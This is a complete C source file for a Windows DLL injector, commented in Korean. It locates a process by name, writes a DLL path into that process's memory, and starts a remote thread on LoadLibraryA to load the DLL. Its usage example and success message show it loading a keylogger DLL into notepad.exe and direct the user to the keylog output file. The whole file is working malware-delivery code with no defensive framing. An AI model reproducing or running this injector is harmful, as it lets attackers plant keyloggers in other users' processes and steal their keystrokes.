#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

// 프로세스 이름으로 PID 찾기
DWORD GetProcessIdByName(const char* processName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }
    
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    
    if (!Process32First(hSnapshot, &pe32)) {
        CloseHandle(hSnapshot);
        return 0;
    }
    
    do {
        if (_stricmp(pe32.szExeFile, processName) == 0) {
            CloseHandle(hSnapshot);
            return pe32.th32ProcessID;
        }
    } while (Process32Next(hSnapshot, &pe32));
    
    CloseHandle(hSnapshot);
    return 0;
}

// DLL 인젝션 함수
BOOL InjectDLL(DWORD processId, const char* dllPath) {
    printf("[*] Target Process ID: %lu\n", processId);
    printf("[*] DLL Path: %s\n", dllPath);
    
    // 1. 타겟 프로세스 열기
    HANDLE hProcess = OpenProcess(
        PROCESS_CREATE_THREAD | 
        PROCESS_QUERY_INFORMATION | 
        PROCESS_VM_OPERATION | 
        PROCESS_VM_WRITE | 
        PROCESS_VM_READ,
        FALSE,
        processId
    );
    
    if (hProcess == NULL) {
        printf("[-] Failed to open process! Error: %lu\n", GetLastError());
        return FALSE;
    }
    printf("[+] Process opened successfully\n");
    
    // 2. 타겟 프로세스에 메모리 할당
    SIZE_T dllPathLen = strlen(dllPath) + 1;
    LPVOID pDllPath = VirtualAllocEx(
        hProcess,
        NULL,
        dllPathLen,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (pDllPath == NULL) {
        printf("[-] Failed to allocate memory! Error: %lu\n", GetLastError());
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Memory allocated at: 0x%p\n", pDllPath);
    
    // 3. DLL 경로를 타겟 프로세스 메모리에 쓰기
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(hProcess, pDllPath, dllPath, dllPathLen, &bytesWritten)) {
        printf("[-] Failed to write memory! Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] DLL path written to process memory (%zu bytes)\n", bytesWritten);
    
    // 4. LoadLibraryA 함수 주소 가져오기
    HMODULE hKernel32 = GetModuleHandle("kernel32.dll");
    LPVOID pLoadLibraryA = (LPVOID)GetProcAddress(hKernel32, "LoadLibraryA");
    
    if (pLoadLibraryA == NULL) {
        printf("[-] Failed to get LoadLibraryA address!\n");
        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] LoadLibraryA address: 0x%p\n", pLoadLibraryA);
    
    // 5. 원격 스레드 생성 (LoadLibraryA 실행)
    HANDLE hThread = CreateRemoteThread(
        hProcess,
        NULL,
        0,
        (LPTHREAD_START_ROUTINE)pLoadLibraryA,
        pDllPath,
        0,
        NULL
    );
    
    if (hThread == NULL) {
        printf("[-] Failed to create remote thread! Error: %lu\n", GetLastError());
        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    printf("[+] Remote thread created successfully\n");
    
    // 6. 스레드 완료 대기
    WaitForSingleObject(hThread, INFINITE);
    printf("[+] DLL injection completed!\n");
    
    // 7. 정리
    VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);
    
    return TRUE;
}

int main(int argc, char* argv[]) {
    printf("=================================\n");
    printf("DLL Injector\n");
    printf("=================================\n\n");
    
    if (argc != 3) {
        printf("Usage: %s <process_name> <dll_path>\n", argv[0]);
        printf("Example: %s notepad.exe C:\\\\keylogger.dll\n", argv[0]);
        return 1;
    }
    
    const char* processName = argv[1];
    const char* dllPath = argv[2];
    
    // 프로세스 ID 찾기
    printf("[*] Searching for process: %s\n", processName);
    DWORD processId = GetProcessIdByName(processName);
    
    if (processId == 0) {
        printf("[-] Process not found!\n");
        printf("[-] Make sure %s is running\n", processName);
        return 1;
    }
    
    // DLL 파일 존재 확인
    if (GetFileAttributes(dllPath) == INVALID_FILE_ATTRIBUTES) {
        printf("[-] DLL file not found: %s\n", dllPath);
        return 1;
    }
    
    // DLL 인젝션 실행
    if (InjectDLL(processId, dllPath)) {
        printf("\n[SUCCESS] DLL injected successfully!\n");
        printf("Check C:\\keylog_dll.txt for keylogger output\n");
        return 0;
    } else {
        printf("\n[FAILED] DLL injection failed!\n");
        return 1;
    }
}
